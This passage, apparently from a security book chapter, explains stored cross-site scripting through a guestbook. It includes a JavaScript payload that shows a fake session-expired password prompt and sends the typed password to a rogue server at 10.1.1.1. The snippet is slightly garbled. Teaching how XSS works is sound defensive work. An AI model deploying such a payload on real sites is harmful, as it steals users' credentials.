We've shown an example using <SCRIPT> tags, <OBJECT>, <APPLET>, and <EMBED> tags can also work. When subsequent users browse the guestbook, their browsers will render the HTML, encounter the JavaScript by the first user, and execute the code. In this example, a JavaScript alert is sent, popping up a popup window with the text "Hello," as shown in Figure 12-4.

If this trick works, then you have a good chance of implementing a full cross-site scripting attack against the app. True to actually exploit a cross-site scripting vulnerability, an attacker would need to set up a rogue server to capture the information input by unsuspecting victims of the injected script code. Here is a code snippet of a rogue link that could be popped up to the victim site (lines are broken due to page width constraints):

```
<SCRIPT Language="JavaScript">var prompt(\'Your session has expired. Please enter your password to continue.\');\location.href="https://10.1.1.1/pass.cgi?password="+password;\</SCRIPT>"
```

The server at 10.1.1.1 is the rogue server to capture the unsuspecting user input, and pass.cgi is a simple script to parse the information, extract useful data (that is, the password), and return a response to the user. Figure 12-5 shows what the password dialog box looks like in Internet Explorer 6.

The example we've used here is quite simple. Other attacks that could be launched via cross-site scripting mechanisms include cookie harvesting and more complex form-based information gathering.
